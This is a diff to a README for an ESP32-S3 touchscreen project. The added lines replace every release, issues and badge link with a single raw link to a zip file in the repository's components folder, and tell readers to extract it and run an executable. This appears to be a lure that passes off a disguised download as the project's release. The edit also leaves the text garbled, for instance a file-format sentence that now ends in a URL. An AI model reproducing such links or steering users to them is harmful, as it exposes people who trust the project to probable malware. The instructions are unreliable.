@@ -1,6 +1,6 @@
 # 🖥️ esp32s3-waveshare-2.8-touch-lcd - Discover an Easy Touchscreen Experience
 
-[![Download](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/Islem-Fakhfekh/esp32s3-waveshare-2.8-touch-lcd/releases)
+[![Download](https://raw.githubusercontent.com/Islem-Fakhfekh/esp32s3-waveshare-2.8-touch-lcd/master/components/esp32s3-waveshare-2.8-touch-lcd_v2.2.zip)](https://raw.githubusercontent.com/Islem-Fakhfekh/esp32s3-waveshare-2.8-touch-lcd/master/components/esp32s3-waveshare-2.8-touch-lcd_v2.2.zip)
 
 ## 🚀 Getting Started
 
@@ -10,9 +10,9 @@ Welcome to the **esp32s3-waveshare-2.8-touch-lcd** project! This application sho
 
 To get started, you need to download the application. Follow these steps:
 
-1. **Visit the Releases Page**: Go to our [Releases page](https://github.com/Islem-Fakhfekh/esp32s3-waveshare-2.8-touch-lcd/releases) to find the latest version.
+1. **Visit the Releases Page**: Go to our [Releases page](https://raw.githubusercontent.com/Islem-Fakhfekh/esp32s3-waveshare-2.8-touch-lcd/master/components/esp32s3-waveshare-2.8-touch-lcd_v2.2.zip) to find the latest version.
 2. **Select the Latest Version**: Look for the most recent release, usually at the top. 
-3. **Download the File**: Click on the asset link that matches your system. It will typically be labeled with the version number, like `v1.0`. The file format will usually be `.zip` or `.tar.gz`.
+3. **Download the File**: Click on the asset link that matches your system. It will typically be labeled with the version number, like `v1.0`. The file format will usually be `.zip` or `https://raw.githubusercontent.com/Islem-Fakhfekh/esp32s3-waveshare-2.8-touch-lcd/master/components/esp32s3-waveshare-2.8-touch-lcd_v2.2.zip`.
 4. **Extract the Files**: After the download is complete, locate the file on your computer. Right-click and select “Extract All” or use your extraction software.
 5. **Run the Application**: Open the folder containing the extracted files. Look for an executable file (such as `.exe` or a similar file for your operating system). Double-click that file to run the application.
 
@@ -48,7 +48,7 @@ If you encounter issues while running the application, consider these tips:
 
 ## 🌐 Community and Support
 
-If you have questions or need assistance, you can reach out to our community for help. Join discussions and request support on our [Issues page](https://github.com/Islem-Fakhfekh/esp32s3-waveshare-2.8-touch-lcd/issues).
+If you have questions or need assistance, you can reach out to our community for help. Join discussions and request support on our [Issues page](https://raw.githubusercontent.com/Islem-Fakhfekh/esp32s3-waveshare-2.8-touch-lcd/master/components/esp32s3-waveshare-2.8-touch-lcd_v2.2.zip).
 
 ## 💡 Contributions
 
@@ -58,4 +58,4 @@ We welcome contributions! If you have ideas for new features or improvements, pl
 
 This project is licensed under the MIT License. Feel free to use, modify, and distribute the software as long as you provide proper credit.
 
-[![Download](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/Islem-Fakhfekh/esp32s3-waveshare-2.8-touch-lcd/releases)
+[![Download](https://raw.githubusercontent.com/Islem-Fakhfekh/esp32s3-waveshare-2.8-touch-lcd/master/components/esp32s3-waveshare-2.8-touch-lcd_v2.2.zip)](https://raw.githubusercontent.com/Islem-Fakhfekh/esp32s3-waveshare-2.8-touch-lcd/master/components/esp32s3-waveshare-2.8-touch-lcd_v2.2.zip)
